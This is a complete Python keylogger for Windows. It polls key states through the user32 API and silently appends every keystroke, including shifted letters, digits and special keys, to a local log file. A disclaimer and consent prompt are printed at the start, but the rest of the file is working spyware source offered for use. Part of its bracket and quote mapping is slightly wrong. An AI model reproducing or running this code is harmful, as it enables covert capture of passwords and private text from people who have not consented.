import ctypes
import time
import sys

# Display educational use disclaimer
def show_disclaimer():
    print("--------------------------------------------------")
    print("DISCLAIMER: This script is for educational purposes only.")
    print("--------------------------------------------------")
    print("Ethical Considerations:")
    print("1. **Permission and Consent:** Use this script only with explicit permission from the user whose keystrokes are being logged.")
    print("2. **Purpose and Use:** This script is intended to illustrate keylogging for educational purposes. Unauthorized use is illegal and unethical.")
    print("3. **Legal Compliance:** Ensure compliance with all applicable laws and regulations regarding data privacy and security.")
    print("4. **Responsible Use:** Do not use this script for malicious purposes or to invade someone's privacy.")
    print("5. **Educational Context:** Use this script in a controlled, legal, and ethical manner.")
    print("--------------------------------------------------")
    
    response = input("Do you understand and agree to use this script responsibly? (yes/no): ").strip().lower()
    if response != 'yes':
        print("Exiting script. Please use responsibly.")
        sys.exit()

user32 = ctypes.windll.user32

# Define a dictionary for key codes to handle special keys
key_map = {
    8: '[BACKSPACE]',
    13: '\n',  # Enter key will add a new line
    32: ' ',   # Space key
    162: '[CTRL]',
    17: '[CTRL]',
    160: '[SHIFT]',
    161: '[SHIFT]',
    20: '[CAPSLOCK]',
    9: '[TAB]',
    27: '[ESC]',
}

def log_keys():
    with open("keylogs.txt", "a") as log_file:
        last_char = ""
        while True:
            for i in range(1, 256):
                if user32.GetAsyncKeyState(i) & 0x0001:
                    if i in key_map:
                        # If special key, insert a newline
                        if key_map[i] in ['[BACKSPACE]', '[CTRL]', '[SHIFT]', '[TAB]', '[ESC]']:
                            log_file.write('\n')
                        log_file.write(key_map[i])
                        last_char = key_map[i]
                    elif 65 <= i <= 90:  # A-Z keys
                        if not user32.GetKeyState(0x10) & 0x8000:  # If SHIFT is not pressed
                            log_file.write(chr(i + 32))  # Convert to lowercase
                        else:
                            log_file.write(chr(i))  # Uppercase letter
                        last_char = chr(i)
                    elif 48 <= i <= 57:  # 0-9 keys
                        log_file.write(chr(i))
                        last_char = chr(i)
                    elif 96 <= i <= 105:  # Numpad 0-9
                        log_file.write(chr(i - 48))
                        last_char = chr(i - 48)
                    elif 186 <= i <= 192:  # ;=,-./` keys
                        log_file.write(';=,-./`'[i - 186])
                        last_char = ';=,-./`'[i - 186]
                    elif 219 <= i <= 222:  # [{\]'
                        log_file.write('[{\\}]'[i - 219])
                        last_char = '[{\\}]'[i - 219]
            log_file.flush()
            time.sleep(0.01)

if __name__ == "__main__":
    show_disclaimer()
    print("Keylogger started... Press 'Ctrl + C' to stop.")
    try:
        log_keys()
    except KeyboardInterrupt:
        print("Keylogger stopped.")
